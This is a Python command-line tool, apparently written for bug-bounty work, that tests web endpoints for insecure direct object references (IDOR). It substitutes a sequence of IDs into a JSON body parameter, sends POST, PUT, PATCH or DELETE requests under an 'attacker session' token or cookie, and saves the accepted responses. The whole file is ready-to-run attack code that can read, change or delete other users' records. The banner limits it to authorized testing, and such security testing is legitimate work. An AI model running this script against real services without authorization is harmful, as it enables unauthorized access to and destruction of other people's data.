#!/usr/bin/env python3
"""
IDOR POST Body Tester
=====================
Tests IDOR in POST/PUT/PATCH/DELETE endpoints by swapping
object IDs inside the request body or headers.

Usage: python3 post_idor_tester.py --help

⚠️  For authorized testing only. Always stay within program scope.
"""

import argparse
import requests
import json
import time
from datetime import datetime

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def banner():
    print(f"""{CYAN}{BOLD}
╔══════════════════════════════════════════╗
║      IDOR POST Body Tester v1.0          ║
║   For authorized bug bounty testing only ║
╚══════════════════════════════════════════╝{RESET}
""")

def load_body(body_str: str) -> dict:
    """Parse JSON body string."""
    try:
        return json.loads(body_str)
    except json.JSONDecodeError as e:
        print(f"{RED}[!] Invalid JSON body: {e}{RESET}")
        exit(1)

def test_post_idor(args):
    banner()

    session = requests.Session()

    # Auth headers
    headers = {
        "User-Agent": "IDOR-PostTester/1.0",
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    if args.token:
        headers["Authorization"] = f"Bearer {args.token}"
    if args.cookie:
        headers["Cookie"] = args.cookie

    body = load_body(args.body)
    results = []
    found = 0

    print(f"{BOLD}[*] Target URL  : {args.url}{RESET}")
    print(f"{BOLD}[*] Method      : {args.method.upper()}{RESET}")
    print(f"{BOLD}[*] Body Param  : {args.param}{RESET}")
    print(f"{BOLD}[*] ID Range    : {args.start} → {args.end}{RESET}")
    print(f"{BOLD}[*] Base Body   : {json.dumps(body)}{RESET}\n")

    for resource_id in range(args.start, args.end + 1):
        # Inject the victim ID into the body
        test_body = body.copy()
        test_body[args.param] = resource_id

        try:
            resp = session.request(
                method=args.method.upper(),
                url=args.url,
                headers=headers,
                json=test_body,
                timeout=10
            )

            line = f"  ID={resource_id} | Status={resp.status_code} | Len={len(resp.text)}"

            if resp.status_code in [200, 201]:
                print(f"{GREEN}[HIT]{RESET} {line}")
                results.append({
                    "id": resource_id,
                    "status": resp.status_code,
                    "body_sent": test_body,
                    "response_snippet": resp.text[:300]
                })
                found += 1

            elif resp.status_code == 403:
                print(f"{YELLOW}[403]{RESET} {line}")

            elif resp.status_code == 404:
                print(f"{RED}[404]{RESET} {line}")

            else:
                print(f"[???] {line}")

        except requests.exceptions.RequestException as e:
            print(f"{RED}[ERR]{RESET}  ID={resource_id} | {e}")

        time.sleep(args.delay)

    # Save results
    if results and args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n{GREEN}[+] Results saved to: {args.output}{RESET}")

    print(f"\n{BOLD}{'─'*45}")
    print(f"  Total Tested : {args.end - args.start + 1}")
    print(f"  Hits (2xx)   : {found}")
    print(f"  Timestamp    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'─'*45}{RESET}")


def main():
    parser = argparse.ArgumentParser(
        description="IDOR POST Body Tester — authorized testing only",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--url",    required=True, help="Target endpoint URL")
    parser.add_argument("--method", default="POST", help="HTTP method: POST, PUT, PATCH, DELETE (default: POST)")
    parser.add_argument("--body",   required=True, help='Base JSON body as string\n  e.g. \'{"user_id": 1, "action": "view"}\'')
    parser.add_argument("--param",  required=True, help="Body parameter to enumerate\n  e.g. user_id")
    parser.add_argument("--start",  type=int, default=1,   help="Start ID (default: 1)")
    parser.add_argument("--end",    type=int, default=100, help="End ID (default: 100)")
    parser.add_argument("--token",  default=None, help="Bearer token (attacker session)")
    parser.add_argument("--cookie", default=None, help="Cookie string (attacker session)")
    parser.add_argument("--delay",  type=float, default=0.3, help="Delay between requests in seconds (default: 0.3)")
    parser.add_argument("--output", default="post_idor_results.json", help="Output JSON file (default: post_idor_results.json)")

    args = parser.parse_args()
    test_post_idor(args)


if __name__ == "__main__":
    main()
